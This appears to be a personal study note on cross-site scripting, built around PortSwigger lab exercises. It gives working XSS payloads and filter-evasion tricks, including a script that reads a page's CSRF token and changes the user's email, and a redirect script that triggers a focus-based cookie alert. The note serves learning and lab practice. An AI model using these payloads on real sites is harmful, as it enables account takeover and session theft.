# XSS
Tags: #javascript #xss #csrf #waf
See also:
Related to: [[web-application-firewall]]
Previous:

## Links
Portswigger cheatsheet:
https://portswigger.net/web-security/cross-site-scripting/cheat-sheet

PayloadAllTheThings
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection


## Very useful one
`<svg><animate onbegin=alert(1) attributeName=x dur=1s>`

## DOM-based
Scroll down:
https://portswigger.net/web-security/cross-site-scripting/dom-based

## XSS with CSRF after a page loads:
- Waits until page loads
- Grabs CSRF token from the form
- Changes a user's email

```
<script>
window.onload = function() {
    var target = 'https://ac951f1a1f7b66ddc0315a3500fa0083.web-security-academy.net/my-account/change-email'

    // post body data 
    new_email = encodeURI('new@email.com')
    token = document.getElementsByTagName('form')[0][0].value

    // request options
    var req_options = {
        method: 'POST',
        body: `email=${new_email}&csrf=${token}`
    }

    // send POST request
    fetch(target, req_options)
        .then(res => res)
        .then(res => console.log(res));
};
</script>
```

### Canonical tags
Link: https://portswigger.net/web-security/cross-site-scripting/contexts/lab-canonical-link-tag
Link: https://security.stackexchange.com/questions/205975/is-xss-in-canonical-link-possible

Requires special action from a user to pull off.

Example payload (requires the user to do ALT + X):
`?param=canary'accesskey='X'onclick='alert(1)'`

### Stored XSS into `onclick` event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped
Link: https://portswigger.net/web-security/cross-site-scripting/contexts/lab-onclick-event-angle-brackets-double-quotes-html-encoded-single-quotes-backslash-escaped

HTML encoding can be used when injecting into a JS context that is run on an `onclick`, even when there is encoding. 

e.g. you can encode aptrophes and get a payload like this:
`&apos;-alert(document.domain)-&apos;`

### Into templates
When injecting into backticks, you can use `${alert(1)}` to get code to execute

## Evasion
### Custom tags
- Make up your own tags to get around filters:
- HackTricks example: (https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting#custom-tags)
- On Portswiggr, this required 
	* using their "Exploit server"
	* wrapping the exploit in script tag
	* Using `location =` on the payload, and
	* Adding URL encoding the path part of the URL.
	
Exploit:
`?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x'`

`tabindex` allows an element to be focusable 
`#x` at the end of the URL makes the browser focus on x

Final payload:
	```
	<script>
	location = 'https://ac971f411f96a7fac05f188201a50001web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x';
	</script> 
	```
	
## Backslash-escaped backslash and single-quote 
Link: Escaping JavaScript Escapes
https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#escaping-javascript-escapes
e.g. injecting into a JavaScript context
`?search=</script><script>alert(`XSS`);</script>`
- Basically you interrupt their script tags with your own